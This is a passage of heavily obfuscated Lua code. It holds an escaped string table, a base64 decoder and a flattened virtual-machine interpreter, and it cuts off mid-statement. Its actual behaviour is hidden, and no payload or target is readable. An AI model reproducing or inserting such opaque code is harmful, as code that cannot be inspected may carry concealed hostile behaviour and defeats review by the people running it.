65\106\121\067\086\109\099\113\090\085\072\109\117\075\072\107\088\078\077\082\076\049\122\065\117\114\083\116\061";"\107\051\112\100\048\081\048\061","\050\068\051\051\050\047\082\077\078\082\117\118\051\090\088\119\054\055\085\054\066\078\108\043\054\107\054\103\082\107\079\099\101\112\056\101\054\098\055\043\056\078\110\103\077\070\071\101\079\121\050\070\070\047\057\066\074\052\057\061";"\087\066\118\087\100\107\097\084\083\101\061\061";"\084\108\043\081\048\090\047\054\082\114\112\076\116\048\083\081\122\090\106\061";"\101\049\067\067\078\086\073\087\090\057\050\113\103\118\077\121\103\100\061\061","\086\079\073\052\118\089\102\086\072\100\061\061";"\049\075\057\121\083\049\117\089\065\085\043\056\106\104\122\106\118\087\086\068\090\120\053\115\069\118\082\102\098\053\054\116\109\078\103\068\103\068\097\085\102\069\097\049","\122\089\089\112\076\088\070\066\072\109\103\066\104\110\055\114\097\100\107\107\116\084\048\061","\068\122\072\082\057\074\104\072\111\079\061\061";"\116\114\088\122\117\090\112\089\119\108\043\081\100\050\111\119\117\079\061\061";"\074\049\122\061","\055\118\108\116\056\101\090\051\111\068\073\050\086\090\082\069\072\054\066\119\114\057\121\066\104\085\069\120\105\090\050\061","\086\072\115\089\081\112\065\089\076\098\103\083\050\078\054\103\082\079\061\061";"\110\121\047\073\051\120\088\099\122\052\121\118\116\090\107\051\048\067\122\061";"\119\114\055\111\084\073\043\065\116\050\082\057\104\110\076\050","\108\101\070\071\089\087\105\071\103\072\107\112\109\047\118\110\082\119\106\061","\098\043\051\072\047\083\061\061";"\107\107\089\108\109\108\116\081\112\071\066\097\122\048\077\050\050\116\047\074\117\083\074\054\078\117\102\073";"\113\119\090\108\110\074\071\116\055\053\067\080\073\119\100\107\115\101\061\061";"\067\083\109\078\076\086\083\116\099\100\061\061","\108\048\077\068\102\069\084\122\107\101\099\047\081\078\110\075\105\071\116\067\085\090\088\076\085\049\112\056\103\101\061\061";"\073\105\074\100\107\117\089\114\122\101\081\049\070\057\112\061","\072\043\078\115\078\085\083\103\121\101\061\061","\053\065\051\103\080\119\090\077\103\079\061\061","\053\111\111\113\078\066\105\102\105\100\061\061";"\119\120\055\105\116\120\119\099\106\073\117\121\084\120\119\102\084\120\119\050\106\100\061\061";"\056\053\107\116\088\051\087\061","\101\066\088\115\076\118\103\051\074\055\047\122\056\079\061\061","\068\120\119\072","\043\082\109\090\049\116\119\083\051\118\056\079\088\117\079\112\053\049\116\061","\116\052\088\077\084\085\107\074\068\110\088\081\068\075\100\061","\087\055\078\048\073\076\066\073\114\075\089\069\114\049\098\110\085\114\107\116\122\108\116\079\119\088\120\066","\078\075\118\077\107\052\085\107\054\079\061\061","\043\052\081\119\118\118\107\105\116\048\081\117\122\055\107\071\049\100\061\061";"\101\057\048\099\118\054\076\057\110\069\105\110\072\074\050\055\086\079\061\061","\109\066\108\098\072\069\077\107\109\100\061\061","\120\085\076\120\068\121\082\109\071\083\061\061";"\101\070\066\106\055\074\072\050\088\100\061\061"}local function R(R)return z[R+(-73018+102529)]end for R,F in ipairs({{-914315-(-914316),-199393-(-199709)},{-517747+517748;-536126-(-536204)};{-275618+275697;445448-445132}})do while F[708664+-708663]<F[-532454+532456]do z[F[103257+-103256]],z[F[-328280-(-328282)]],F[317023+-317022],F[-1044538+1044540]=z[F[783712-783710]],z[F[696361+-696360]],F[-401031-(-401032)]+(-813857+813858),F[750566-750564]-(65532-65531)end end do local R=string.sub local F=math.floor local h=string.len local Q=table.insert local v={w=-772000-(-772021);Y=-336712-(-336769),N=902638+-902608;["\049"]=-254435+254453,["\048"]=756582+-756562,W=306830-306786,["\054"]=639321+-639278,Z=-837592+837644,["\053"]=188271+-188240;S=728886-728854,i=-252014-(-252059);M=812541+-812507,d=-476482+476498;k=-346821+346854,h=-1020135+1020161,O=379627-379579,a=-165269-(-165271),["\043"]=888569-888544,m=49770+-49711,u=462685-462668,l=-971398+971405,I=408856-408852,H=-273395-(-273441);J=1031804-1031803,F=-545056-(-545066),f=-575118-(-575153),K=-805630-(-805669),x=-587702+587708;j=894777+-894769,s=114287-114224,["\052"]=-592350-(-592388),Q=287739+-287686;z=414054-414042;q=-82468+82526;["\050"]=-902171-(-902207);A=10637+-10590;["\047"]=420029+-420020,T=728662-728633,C=675377+-675322,E=-932777+932837;G=-459388-(-459391),r=-757964-(-758018);["\056"]=-914397-(-914421),g=-698882-(-698897);D=-711730+711757;n=633110-633088,y=-500501+500538;R=-614716-(-614729);v=326460-326441;c=1005053+-1005003,B=-32426+32468,["\051"]=286021+-286007;X=531408+-531347,t=-485958+485986,P=268159-268108,p=-319376+319432;V=222352-222341,["\055"]=-119520-(-119525),L=1047704-1047655;U=-1003862+1003885,b=626667+-626605,o=706300-706259;["\057"]=406795+-406755,e=330275-330275}local X=type local L=z local a=string.char local B=table.concat for z=19871-19870,#L,515425+-515424 do local C=L[z]if X(C)=="\115\116\114\105\110\103"then local X=h(C)local D={}local y=3668-3667 local b=-93145+93145 local S=-365220+365220 while y<=X do local z=R(C,y,y)local h=v[z]if h then b=b+h*(79162+-79098)^((-638146-(-638149))-S)S=S+(822157-822156)if S==-355931-(-355935)then S=1012158+-1012158 local z=F(b/(527160+-461624))local R=F((b%(-547993+613529))/(422198-421942))local h=b%(-526502-(-526758))Q(D,a(z,R,h))b=-727768+727768 end elseif z=="\061"then Q(D,a(F(b/(-299848-(-365384)))))if y>=X or R(C,y+(-718528+718529),y+(-671233+671234))~="\061"then Q(D,a(F((b%(-193486+259022))/(-874695-(-874951)))))end break end y=y+(-179582-(-179583))end L[z]=B(D)end end end return(function(z,h,Q,v,X,L,a,F,B,j,k,x,f,A,P,y,D,C,Z,s,b,M,S)x,P,b,Z,f,S,D,k,j,F,A,C,B,M,y,s=function(z,R)local h=b(R)local Q=function(Q,v)return F(z,{Q;v},R,h)end return Q end,function(z,R)local h=b(R)local Q=function(...)return F(z,{...},R,h)end return Q end,function(z)for R=904041+-904040,#z,-820952+820953 do C[z[R]]=C[z[R]]+(-196942+196943)end if Q then local F=Q(true)local h=X(F)h[R(-334424-(-305207))],h[R(28825+-58044)],h[R(411484-440860)]=z,S,function()return-352096+-335484 end return F else return v({},{[R(-941175+911956)]=S;[R(697427-726644)]=z,[R(-142711+113335)]=function()return-415296-272284 end})end end,function(z,R)local h=b(R)local Q=function(Q)return F(z,{Q},R,h)end return Q end,function(z,R)local h=b(R)local Q=function()return F(z,{},R,h)end return Q end,function(z)local R,F=584161+-584160,z[155743-155742]while F do C[F],R=C[F]-(-436391-(-436392)),(-403417+403418)+R if-212799+212799==C[F]then C[F],B[F]=nil,nil end F=z[R]end end,function()y=y+(-15937+15938)C[y]=897883-897882 return y end,function(z)C[z]=C[z]-(-148747-(-148748))if-989187-(-989187)==C[z]then C[z],B[z]=nil,nil end end,function(z,R)local h=b(R)local Q=function(Q,v,X,L)return F(z,{Q;v,X;L},R,h)end return Q end,function(F,Q,v,X)local l,E,p,m,b,d,R0,h0,w,I,T,t,G,c,Q0,y,C,n,a,K,U,J,H,q,N,S,u,Y,e,v0,i,O,g,z0,P,V,F0,o,W,r while F do if F<643605+8845353 then if F<-294058+4929132 then if F<2117413-(-152157)then if F<729824-(-634308)then if F<1733274-770715 then if F<-492308+1063783 then if F<964349+-678221 then F=Z(476494+5383710,{S})d={F()}a={h(d)}F=z[R(419658+-449095)]else t=#I K=-412004-(-412004)i=t==K F=i and 7497649-879803 or 554149+10410133 end else if F<820410+41986 then F=z[R(390771+-420079)]a={}else S=R(454666+-484098)n=R(-674810+645405)a=z[S]P=B[v[806957-806955]]q=27816363778388-847547 G=B[v[-727087+727090]]p=G(n,q)S=P[p]q=-311098+28044470661693 F=a[S]S=x(13610178-(-150680),{v[451609+-451607],v[-562199-(-562202)]})a=F(S)S=R(-47985-(-18553))a=z[S]n=R(-519298+489804)P=B[v[34130-34128]]G=B[v[-864356-(-864359)]]p=G(n,q)S=P[p]F=a[S]S=A(-865969+9344528,{v[-49709-(-49711)],v[36831+-36828]})a=F(S)F=7745839-620147 end end else if F<1352283-11423 then if F<833679+270648 then F=z[R(933809+-963033)]a={}else F=9353496-459094 end else P=-293573-(-293575)S=-948394+948395 y=B[v[59686+-59685]]b=y(S,P)y=308567-308566 C=b==y a=C F=C and 9485953-449464 or 534809+4483635 end end else if F<2003924-365978 then if F<1874001-337507 then if F<-157650+1649374 then C=k(C)F=z[R(-811801-(-782377))]a={}else F={}B[v[16111+-16109]]=F a=B[v[136535-136532]]p=-675263-(-675518)P=1021251+35184371067581 n=R(-356907+327576)S=a a=y%P B[v[-49227-(-49231)]]=a G=y%p p=576574-576572 F=2446763-(-521288)P=G+p B[v[-1002562+1002567]]=P p=z[n]n=R(-104604-(-75162))G=p[n]p=G(C)n=415088-415087 q=p G=R(174545-203841)u=704096-704095 b[y]=G T=u G=432098+-432050 u=573922+-573922 o=T<u u=n-T end else c=-222-(-223)w=W[c]J=w F=97114+16223413 end else if F<1427625-(-526422)then if F<1386218-(-482993)then e=R(-309892+280554)O=R(-231353-(-201872))F=z[O]K=z[e]O=F(K)F=R(-512365-(-483158))z[F]=O F=186936+12499875 else w=F U=883555+-883554 l=W[U]U=false c=l==U J=c F=c and 281608+9213113 or 11556210-476187 end else F=B[v[115312+-115302]]y=B[v[919168-919157]]C[F]=y F=B[v[851807-851795]]y={F(C)}F=z[R(-923980+894723)]a={h(y)}end end end else if F<-512075+3570246 then if F<2694327-(-275016)then if F<119708+2453520 then if F<-864591+3333546 then b=R(-73807-(-44416))y=z[b]b=R(21171-50383)F=z[R(393504-422890)]C=y[b]b=B[v[466028+-466027]]y={C(b)}a={h(y)}else F=b F=7785259-398232 a[C]=y end else if F<2598418-(-329615)then n=R(342310+-371787)q=-299240+16036124143123 S=R(275130+-304562)a=z[S]P=B[v[-213481+213483]]G=B[v[-176344-(-176347)]]p=G(n,q)S=P[p]F=a[S]S=f(6759062-632004,{v[600231-600225],v[-900811-(-900813)];v[1020471+-1020468]})a=F(S)n=R(-342446-(-313094))S=R(-680076-(-650644))a=z[S]q=693776+18438709955450 P=B[v[-180335+180337]]G=B[v[-835022+835025]]p=G(n,q)S=P[p]F=a[S]S=j(3387967-(-63474),{v[118585+-118583];v[530387+-530384]})a=F(S)F=4529055-750362 else I=not o u=u+T n=u<=q n=I and n I=u>=q I=o and I n=I or n I=-104037+11080654 F=n and I n=11820562-512155 F=F or n end end else if F<2705981-(-336479)then if F<2280598-(-737442)then F=true F=-597123+878379 else K=R(239458-268665)F=z[K]K=R(-753438-(-724100))z[K]=F F=11749674-(-937137)end else F=true F=F and 866639+12607902 or 13531817-893619 end end else if F<2923055-(-511999)then if F<-818981+4097188 then if F<281622+2994440 then y=B[v[-395122-(-395125)]]b=967781+-967633 C=y*b y=-568187-(-568444)F=8108765-(-1011199)a=C%y B[v[-871814+871817]]=a else b=11369338-(-104535)y=R(-786344+757058)C=y^b a=192682+7966534 F=a-C C=F a=R(98371-127772)F=a/C a={F}F=z[R(867525+-897023)]end else g=-617293+617294 e=D()H=R(-1018820-(-989319))B[e]=E a=z[H]Y=882059-881959 H=R(-804886+775403)F=a[H]V=912967-902967 H=170315-170314 m=551503-551248 r=583305-583305 a=F(H,Y)W=-397133+397135 H=D()c=R(-474877+445396)B[H]=a F=B[p]Y=377151-377151 a=F(Y,m)m=722737+-722736 Y=D()B[Y]=a F=B[p]N=B[H]a=F(m,N)m=D()B[m]=a a=B[p]N=a(g,W)a=440427-440426 F=N==a W=R(-540506+511182)N=D()a=R(924526-954013)B[N]=F w=z[c]l=B[p]U={l(r,V)}c=w(h(U))w=R(-539750-(-510426))J=c..w g=W..J F=R(-470473-(-441083))F=i[F]F=F(i,a,g)g=D()J=Z(2190509-842354,{p,e,u,b;y;t,N,g;H;m;Y,q})W=R(637114-666320)B[g]=F a=z[W]W={a(J)}F={h(W)}W=F F=B[N]F=F and-133020+5637537 or 12163231-999747 end else if F<4612588-825882 then if F<3539700-84711 then a=R(813501+-842775)P=R(174380+-203813)F=z[a]y=B[v[383912+-383911]]G=17098941024720-289462 b=B[v[347267+-347265]]S=b(P,G)C=y[S]a=R(-152020-(-122534))a=F[a]G=20233498500666-(-804499)P=R(577814-607234)a=a(F,C)F=R(-710212-(-680756))F=a[F]y=B[v[-538441-(-538442)]]b=B[v[-1029704+1029706]]S=b(P,G)G=2049492791420-945346 C=y[S]F=F(a,C)y=B[v[-621315+621316]]P=R(-550283+520847)a=R(-605425+575969)b=B[v[-325165+325167]]S=b(P,G)G=241840+12818902492833 C=y[S]a=F[a]a=a(F,C)y=B[v[-987597+987598]]P=R(-466321+436994)F=R(590778-620234)F=a[F]b=B[v[431001-430999]]S=b(P,G)C=y[S]F=F(a,C)G=17137547040393-178013 y=B[v[-999355-(-999356)]]P=R(486262+-515464)b=B[v[429979+-429977]]S=b(P,G)C=y[S]a=R(-861527+832071)P=R(-814035-(-784707))a=F[a]a=a(F,C)y=B[v[-677570+677571]]b=B[v[-381189-(-381191)]]G=35112859396343-(-1005287)S=b(P,G)F=R(977259-1006715)F=a[F]C=y[S]G=12424649143499-(-516558)P=R(-852195-(-822725))F=F(a,C)a=R(286560+-316016)y=B[v[-114835+114836]]b=B[v[577103-577101]]S=b(P,G)C=y[S]P=R(-359193+329940)a=F[a]a=a(F,C)y=B[v[-650146+650147]]G=27731893540979-861698 F=R(-235693-(-206237))F=a[F]b=B[v[747127-747125]]S=b(P,G)C=y[S]P=R(407415+-436750)F=F(a,C)y=B[v[381381-381380]]G=5281590020850-704855 b=B[v[721261+-721259]]S=b(P,G)C=y[S]a=R(-277820-(-248364))a=F[a]a=a(F,C)F=R(878095+-907551)G=12091825686826-406316 F=a[F]y=B[v[142285+-142284]]P=R(-395691+366318)b=B[v[731297-731295]]S=b(P,G)P=R(-1060498-(-1031143))C=y[S]F=F(a,C)y=B[v[-788287-(-788288)]]a=R(-919983+890527)a=F[a]b=B[v[639789-639787]]G=434439+15119914089081 S=b(P,G)C=y[S]G=-691541+21431874712656 P=R(405131-434353)a=a(F,C)y=B[v[-974204+974205]]b=B[v[-789393-(-789395)]]F=R(635477-664933)S=b(P,G)G=-710250+21676167953879 F=a[F]C=y[S]F=F(a,C)y=B[v[963103+-963102]]P=R(398663-427995)b=B[v[400082-400080]]S=b(P,G)a=R(127168+-156624)P=R(942119-971349)a=F[a]C=y[S]G=30158257532040-341421 a=a(F,C)y=B[v[-269001+269002]]b=B[v[66976-66974]]S=b(P,G)F=R(-217571+188115)F=a[F]P=4520508450755-892810 G=-423611+25831944070583 C=y[S]S=R(978585+-1008039)F=F(a,C)C=B[v[-242570+242571]]y=B[v[-519764+519766]]b=y(S,P)a=C[b]y=B[v[476616+-476615]]P=R(-174935+145565)b=B[v[483115-483113]]S=b(P,G)C=y[S]F[a]=C F=z[R(473010-502505)]a={}else G=B[v[67002-67001]]T=R(-509899-(-480555))n=B[v[-358040-(-358042)]]o=834920+14480944389359 q=B[v[203710+-203707]]u=q(T,o)T=20556631852955-434743 p=n[u]u=R(-888540-(-859343))P=G[p]p=B[v[-236733+236735]]n=B[v[-346141-(-346144)]]q=n(u,T)u=-804664+7444751635650 G=p[q]q=R(-574555-(-545287))S=P[G]G=B[v[-431080-(-431082)]]p=B[v[967589-967586]]n=p(q,u)P=G[n]n=R(-219192+189714)a=S[P]P=B[v[637459-637457]]G=B[v[-557634-(-557637)]]q=-793873+23727010236473 p=G(n,q)S=P[p]F=a[S]F=F and-347385+1241973 or 279640+6846052 end else q=-174965+26407979932542 n=R(228123+-257322)b=B[v[381119+-381118]]P=B[v[930392-930390]]G=B[v[-467227+467230]]p=G(n,q)S=P[p]p=R(448550-477810)y=b[S]S=B[v[643097-643095]]n=363827+20776761579671 P=B[v[121160+-121157]]G=P(p,n)b=S[G]C=y[b]p=1270302262076-(-130835)b=B[v[-168253-(-168255)]]S=B[v[392959+-392956]]G=R(46807+-76058)P=S(G,p)y=b[P]P=R(-183160+153929)a=C[y]G=11048416957553-(-851879)y=B[v[-636424-(-636426)]]b=B[v[35417+-35414]]S=b(P,G)C=y[S]F=a[C]F=F and-261716+14708991 or 53454-(-996571)end end end end else if F<7123076-(-263932)then if F<6643798-396733 then if F<6657496-1034493 then if F<-479904+5886592 then if F<-912027+5912910 then S=nil C=nil a={}y=nil F=z[R(998228+-1027511)]b=nil else y=B[v[-725065+725067]]F=-930344+9966833 b=B[v[104424-104421]]C=y==b a=C end else if F<428325+5112737 then J=B[y]a=J F=J and 2857931-926092 or 6854922-(-178313)else T=R(118251-147557)C=D()y=R(-417184+387752)B[C]=Q[-390277-(-390278)]G=R(550117+-579458)o=383903+13069640055847 a=z[y]b=B[v[814750-814749]]p=-719528+32226598548806 S=B[v[-623434+623436]]P=S(G,p)y=b[P]F=a[y]G=B[C]b=F n=B[v[167702+-167701]]q=B[v[731557-731555]]u=q(T,o)p=n[u]T=31487181097940-447118 u=R(572222-601672)P=G[p]p=B[v[757733+-757732]]b=f(10369220-(-167395),{C;v[-690881+690882],v[295627+-295625];v[311395-311392],v[-618194+618198],v[365516-365511]})n=B[v[506762-506760]]q=n(u,T)G=p[q]T=-598542+5036484995895 S=P[G]P=352964+-352964 y=S or P a=F(y,b)P=B[C]p=B[v[-818354-(-818355)]]n=B[v[-942572+942574]]u=R(673630+-703077)q=n(u,T)G=p[q]S=P[G]q=R(173346-202853)u=166239+3679593397586 G=B[v[906023-906022]]p=B[v[165177+-165175]]n=p(q,u)P=G[n]b=S[P]P=B[v[-828771-(-828772)]]q=885001+7283267243062 n=R(543796-573156)G=B[v[-586885-(-586887)]]p=G(n,q)S=P[p]p=R(-435148+405906)y=b[S]S=B[v[573561-573560]]n=1037487708472-(-813227)P=B[v[-361644+361646]]G=P(p,n)b=S[G]a=y[b]F=a and 126898+9461947 or 856878+556521 end end else if F<357304+5515701 then if F<4987285-(-691604)then q=1002718+-1002463 n=731490+-731490 y=b F=B[v[-623577+623578]]p=F(n,q)C[y]=p F=10232361-844307 y=nil else F=17343988-886391 end else F=B[v[732121+-732120]]G=16797179839981-567136 P=R(84078+-113578)y=B[v[-939883+939885]]b=B[v[122953-122950]]S=b(P,G)a=R(-425993-(-396537))G=178254+9246064040067 C=y[S]a=F[a]a=a(F,C)y=B[v[-770042-(-770044)]]b=B[v[-4946-(-4949)]]P=R(-24378-4978)S=b(P,G)G=7259731393671-(-118957)C=y[S]F=R(702530-731986)F=a[F]F=F(a,C)y=B[v[714825+-714823]]a=R(675567+-705023)a=F[a]P=R(484434+-513900)b=B[v[-781425+781428]]S=b(P,G)C=y[S]G=-329705+2389569457217 P=R(-540819-(-511390))a=a(F,C)y=B[v[-648310-(-648312)]]b=B[v[-447830+447833]]F=R(-581589-(-552133))S=b(P,G)P=R(-831856-(-802592))F=a[F]C=y[S]F=F(a,C)y=B[v[-1019605+1019607]]G=10516367673336-1045719 b=B[v[517540+-517537]]a=R(325084-354540)S=b(P,G)a=F[a]C=y[S]a=a(F,C)G=18308148361046-(-961015)F=R(383472+-412928)P=R(373704-403208)F=a[F]y=B[v[-535310+535312]]b=B[v[954919+-954916]]S=b(P,G)C=y[S]P=R(-23365+-5968)F=F(a,C)G=-668200+208706351753 y=B[v[-997545+997547]]b=B[v[-344092-(-344095)]]S=b(P,G)C=y[S]a=R(-580188+550732)P=R(607672+-637030)a=F[a]G=32126373042059-793883 a=a(F,C)y=B[v[-45816+45818]]b=B[v[923706+-923703]]S=b(P,G)G=423795+33664582190537 F=R(-20184-9272)C=y[S]F=a[F]P=R(404393+-433709)F=F(a,C)y=B[v[-133451-(-133453)]]b=B[v[460643+-460640]]S=b(P,G)G=23410260611403-468662 a=R(-888804+859348)C=y[S]a=F[a]P=R(-116738+87239)a=a(F,C)y=B[v[223881+-223879]]F=R(499026+-528482)b=B[v[183932-183929]]S=b(P,G)C=y[S]P=R(-205464-(-176025))F=a[F]F=F(a,C)G=22755225937316-(-721856)y=B[v[480880-480878]]b=B[v[-382236+382239]]S=b(P,G)C=y[S]a=R(155926-185382)a=F[a]G=238981+23889924802031 a=a(F,C)F=R(279911-309367)P=R(686077+-715466)y=B[v[560930-560928]]F=a[F]b=B[v[823969-823966]]S=b(P,G)C=y[S]F=F(a,C)a=R(-107582-(-78092))a=F[a]a=a(F)F=z[R(72937+-102404)]a={}end end else if F<953742+6057250 then if F<7156879-287719 then if F<7521981-812125 then i={}c=nil W=R(936216-965442)t=D()K=x(11648559-740272,{t;q,u;P})B[t]=i H=R(-687287+658025)z0=675495+29446763914985 e=D()P=k(P)i=D()n=nil B[i]=K Y={}K={}N=R(400553-429770)B[e]=K K=z[H]U=27993762220376-595565 P=R(-344157-(-314883))g=B[e]T=nil m={[N]=g,[W]=c}b=nil T=-422567+20310293108632 p=nil H=K(Y,m)B[S]=H K=j(14596432-(-344018),{e;t,o,q;u;i})q=k(q)t=k(t)G=nil i=k(i)e=k(e)o=k(o)I=nil I=-1031076+24002331060044 B[y]=K u=k(u)b=z[P]V=329794+12692956778196 W=R(408098-437516)F0=-181219+23918805118821 u=R(989338-1018677)p=B[S]n=B[y]q=n(u,T)T=R(-111528-(-82241))P=R(-333163-(-303677))P=b[P]G=p[q]P=P(b,G)G=R(-645693+616419)b=D()B[b]=P i=-664895+1654714165313 o=28958298571335-(-438885)P=z[G]n=B[S]e=16611315272204-633813 q=B[y]G=R(-382201-(-352715))u=q(T,o)p=n[u]G=P[G]N=R(-1603-27663)l=R(590148-619478)G=G(P,p)P=D()K=-584630+31097791996999 r=R(566884-596281)o=R(358605+-388084)p=R(-938762-(-909488))B[P]=G G=z[p]q=B[S]u=B[y]T=u(o,I)n=q[T]p=R(281348+-310834)p=G[p]p=p(G,n)F=z[R(-921038+891817)]G=D()m=26956272536920-(-566192)I=R(-182186+152740)B[G]=p Y=R(169715+-199090)Q0=R(-1044835-(-1015485))n=R(208555+-237829)p=z[n]u=B[S]T=B[y]n=R(-418189+388703)o=T(I,i)q=u[o]n=p[n]t=7412813748174-772691 n=n(p,q)p=D()i=R(586473-615816)B[p]=n q=B[p]T=B[S]o=B[y]I=o(i,t)i=R(436637-465948)u=T[I]n=q[u]q=D()u=R(183644+-213024)g=34777384711238-(-281340)B[q]=n t=1007073+20013986219654 n=z[u]u=n()T=B[S]o=B[y]I=o(i,t)n=T[I]T=M(5695927-96750,{S,y,b,q,G,P,p})u[n]=T T=R(477152+-506532)u=z[T]c=23894583415489-632651 v0=-199799+33067627792541 T=u()t=R(763558-792956)o=B[S]I=B[y]i=I(t,K)u=o[i]n=T[u]a={}I=B[S]K=R(-885159-(-855765))i=B[y]t=i(K,e)o=I[t]t=B[S]b=k(b)K=B[y]e=K(Y,m)i=t[e]e=B[S]t=3603978202-899745 Y=B[y]m=Y(N,g)K=e[m]m=B[S]N=B[y]g=N(W,c)Y=m[g]h0=-410307+16522199048400 m=-877546+877561 g=B[S]q=k(q)W=B[y]R0=12603109847372-1006176 c=W(l,U)N=g[c]c=B[S]l=B[y]U=l(r,V)W=c[U]l=B[S]V=R(172720+-201934)U=B[y]r=U(V,z0)c=l[r]z0=R(-109848+80489)U=B[S]r=B[y]V=r(z0,R0)p=k(p)l=U[V]r=B[S]V=B[y]R0=R(-908540+879325)z0=V(R0,F0)U=r[z0]V=B[S]F0=R(1006621-1035900)z0=B[y]R0=z0(F0,h0)r=V[R0]R0=B[S]F0=B[y]V=true h0=F0(Q0,v0)G=k(G)z0=R0[h0]R0=true g={[W]=c;[l]=U,[r]=V;[z0]=R0}W=R(1471-30885)c=-486792+18319684046554 F0=11688531415340-(-17430)r=R(-158718-(-129295))z0=R(390550-419830)e={[Y]=m;[N]=g}V=31837476623824-220135 m=B[S]N=B[y]g=N(W,c)U=22354749278524-434323 Y=m[g]R0=13033140185977-332740 g=B[S]W=B[y]l=R(-882334-(-852927))c=W(l,U)N=g[c]c=B[S]l=B[y]U=l(r,V)W=c[U]U=B[S]r=B[y]c=true V=r(z0,R0)R0=R(91735-121097)l=U[V]r=B[S]V=B[y]z0=V(R0,F0)U=r[z0]g={[W]=c;[l]=U}l=R(326738+-356150)P=k(P)m={[N]=g}g=B[S]U=-26528+21337304977007 W=B[y]c=W(l,U)y=k(y)N=g[c]S=k(S)g=675532+-675502 I={[i]=t,[K]=e,[Y]=m;[N]=g}T={[o]=I}u=n(T)else F=17063149-999209 b=B[v[943350+-943344]]y=b==C a=y end else b=922169+8405375 y=R(240901+-270409)a=599009+11316917 C=y^b F=a-C C=F a=R(958664-987954)F=a/C a={F}F=z[R(-262470-(-233203))]end else if F<7557603-197691 then if F<6416117-(-633409)then F=-1009615+10117220 B[y]=a else C=k(C)y=k(y)a={}b=nil F=z[R(1933+-31221)]end else F={}y=-1020426+1020427 b=B[v[-757331-(-757340)]]C=F S=b F=8797634-(-590420)b=-442700+442701 P=b b=-510773-(-510773)G=P<b b=y-P end end end else if F<-315768+9346502 then if F<8447980-(-411257)then if F<7551055-(-773334)then if F<8085372-269332 then a={}F=z[R(-81201+51976)]else t=318263+31965149290221 T=3066504051736-767621 F=B[v[740468+-740465]]u=R(-714743-(-685503))i=R(500259+-529761)p=B[v[408808+-408804]]n=B[v[-382663-(-382668)]]q=n(u,T)G=p[q]q=B[v[1012860-1012858]]T=B[v[-653826+653830]]Y=R(996785-1026107)o=B[v[799163-799158]]I=o(i,t)u=T[I]K=-742754+3173966633767 n=q[u]g=897836+21919787791539 T=B[v[-567473+567477]]t=15942308989468-732445 o=B[v[-881922+881927]]i=R(-186754-(-157285))O=R(-875223+845734)I=o(i,t)u=T[I]I=R(-718387+688947)o=z[I]t=B[v[546030-546026]]E=B[v[-757008+757013]]d=E(O,K)i=t[d]m=19371071647110-(-505270)d=R(-885155-(-855740))E=z[d]N=R(-712672+683199)K=B[v[-205278-(-205282)]]e=B[v[-204872+204877]]H=e(Y,m)O=K[H]H=B[v[-117705+117709]]Y=B[v[532940-532935]]m=Y(N,g)e=H[m]K=y..e d=O..K t=E..d I=i..t T=o..I q=u..T p=n..q P=G..p a=F(P)F=264333+4381439 end else a=R(-44690-(-15416))P=R(-863046+833734)G=767333+23967193036339 F=z[a]y=B[v[-689805+689806]]b=B[v[310905+-310903]]S=b(P,G)G=2821805112654-112684 P=R(-754997+725663)a=R(-473407+443921)a=F[a]C=y[S]a=a(F,C)y=B[v[-324897-(-324898)]]b=B[v[161157-161155]]S=b(P,G)C=y[S]G=7980011744075-(-1024824)F=R(965437+-994893)F=a[F]F=F(a,C)P=R(690775+-719983)y=B[v[-232663+232664]]a=R(-1013514-(-984058))b=B[v[544357+-544355]]a=F[a]S=b(P,G)C=y[S]a=a(F,C)F=R(639697-669153)F=a[F]y=B[v[-554256+554257]]b=B[v[-1027895-(-1027897)]]G=-202447+10214695922019 P=R(862777+-891987)S=b(P,G)C=y[S]F=F(a,C)G=24497972136037-(-123946)y=B[v[168911-168910]]a=R(-1025706-(-996250))P=R(-146775+117540)b=B[v[-909744+909746]]a=F[a]S=b(P,G)C=y[S]G=-164298+2953898018601 a=a(F,C)y=B[v[-1041292-(-1041293)]]P=R(735854-765338)b=B[v[-51056-(-51058)]]S=b(P,G)C=y[S]F=R(412581-442037)F=a[F]F=F(a,C)G=66372+14735203211145 y=B[v[485515+-485514]]b=B[v[-74042+74044]]a=R(-1045531-(-1016075))a=F[a]P=R(-419764+390441)S=b(P,G)C=y[S]G=15145543734396-(-67344)a=a(F,C)F=R(385496+-414952)y=B[v[-85975+85976]]F=a[F]b=B[v[166706-166704]]P=R(884284-913493)S=b(P,G)C=y[S]G=17434842278532-(-800050)F=F(a,C)a=R(1009904-1039360)P=R(667057+-696300)y=B[v[11004-11003]]b=B[v[-832526+832528]]a=F[a]S=b(P,G)C=y[S]a=a(F,C)P=R(-637247+607860)y=B[v[-420969+420970]]G=33284+107462557230 b=B[v[-759229-(-759231)]]F=R(-868630-(-839174))S=b(P,G)F=a[F]C=y[S]F=F(a,C)P=R(626439-655742)G=22590293589508-(-1043219)y=B[v[783146-783145]]a=R(-186958+157502)a=F[a]b=B[v[853384-853382]]S=b(P,G)G=229380+5977480202971 C=y[S]a=a(F,C)y=B[v[-946669+946670]]b=B[v[890779-890777]]P=R(9215-38615)S=b(P,G)F=R(-978631+949175)G=27923825693436-172081 F=a[F]C=y[S]P=R(587568-616925)F=F(a,C)y=B[v[626503-626502]]b=B[v[-719234+719236]]S=b(P,G)a=R(-940856-(-911400))a=F[a]C=y[S]P=R(-890131-(-860837))a=a(F,C)y=B[v[-479711-(-479712)]]b=B[v[-103570-(-103572)]]F=R(11913+-41369)G=-913150+32424615504376 S=b(P,G)F=a[F]C=y[S]F=F(a,C)a=R(-1040872+1011382)a=F[a]a=a(F)a={}F=z[R(-1045498+1016018)]end else if F<113241+8906958 then if F<-671870+9585034 then a={y}F=z[R(700149+-729545)]else y=B[v[846788-846787]]S=B[v[397166-397164]]n=593617+13129824373009 p=R(779261-808712)P=B[v[-648076-(-648079)]]G=P(p,n)b=S[G]p=28390262255947-851367 C=y[b]b=B[v[-786748-(-786750)]]S=B[v[389427-389424]]G=R(-413727-(-384489))P=S(G,p)y=b[P]a=C[y]P=R(1027507+-1056878)y=B[v[-465783-(-465785)]]G=-519474+31360016361021 b=B[v[-707387-(-707390)]]S=b(P,G)C=y[S]F=a[C]F=F and 14424585-(-521425)or 11949478-716941 end else B[y]=E F=B[y]F=F and 83454+14571331 or 723194+2254390 end end else if F<9223239-85276 then if F<8601365-(-507864)then if F<9866046-812875 then F=a and 14409066-729778 or-655387+13619848 else e=k(e)g=k(g)Y=k(Y)F=-381788+12341855 W=nil H=k(H)m=k(m)N=k(N)end else y=B[v[-236871+236874]]b=-673450+673451 C=y~=b F=C and 837373+15092519 or 4141851-915849 end else if F<10136464-687247 then if F<-226107+9383931 then 